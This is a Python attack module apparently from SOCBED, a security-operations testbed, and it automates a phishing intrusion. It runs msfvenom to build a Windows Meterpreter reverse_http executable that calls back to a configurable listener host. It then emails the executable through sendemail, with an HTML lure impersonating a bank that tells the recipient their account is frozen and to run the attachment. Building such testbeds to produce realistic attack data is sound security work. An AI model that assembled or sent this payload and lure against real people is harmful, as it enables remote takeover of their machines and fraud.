# Copyright 2016-2022 Fraunhofer FKIE
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


from attacks import Attack, AttackInfo, AttackOptions


class EmailEXEAttackOptions(AttackOptions):
    name = "Recipient name"
    addr = "Recipient email address"
    lhost = "Reverse HTTP target host or IP address"
    lport = "Reverse HTTP target port"

    def _set_defaults(self):
        self.name = "Jane Doe"
        self.addr = "client1@localdomain"
        self.lhost = "172.18.0.3"
        self.lport = "80"


class EmailEXEAttack(Attack):
    info = AttackInfo(
        name="infect_email_exe",
        description="Sends an email containing a malicious .exe")
    options_class = EmailEXEAttackOptions

    def run(self):
        with self.check_printed("Email was sent successfully"):
            self.exec_commands_on_target([
                self._generate_exe_command(),
                self._sendemail_command(self._email_body())])

    def _generate_exe_command(self):
        lhost = self.options.lhost
        lport = self.options.lport
        meterpreter_script = f"msfvenom -p windows/x64/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -a x64 StagerRetryCount=604800 -f exe-only -o /root/Bank-of-Nuthington.exe"
        return meterpreter_script

    def _sendemail_command(self, message):
        return " ".join([
            "sendemail",
            "-f attacker@localdomain",
            "-t {addr}".format(addr=self.options.addr),
            "-s 172.18.0.2",
            "-u 'Frozen User Account'",
            "-m '{msg}'".format(msg=message),
            "-a '/root/Bank-of-Nuthington.exe'",
            "-o tls=no",
            "-o message-content-type=html",
            "-o message-charset=UTF-8",
            ""])

    def _email_body(self):
        return (
            "<p><img src=\"http://172.18.1.1/email_header.jpg\" width=\"1100\" height=\"300\"></p>"
            "<p>Dear {name},</p>"
            "<p>our Technical Support Team unfortunately had to freeze your bank account."
            "   Please download and execute the file provided in the attachment for further"
            "   information.</p>"
            "<p>We apologize for the inconvenience caused, and we are really grateful for your"
            "   collaboration. This is an automated e-mail. Please do not respond.</p>"
            "<p><img src=\"http://172.18.1.1/email_footer.jpg\" width=\"90\" height=\"90\"></p>"
            "<p>&copy; 2017 bankofnuthington.co.uk. All Rights Reserved.</p>"
            "".format(name=self.options.name))
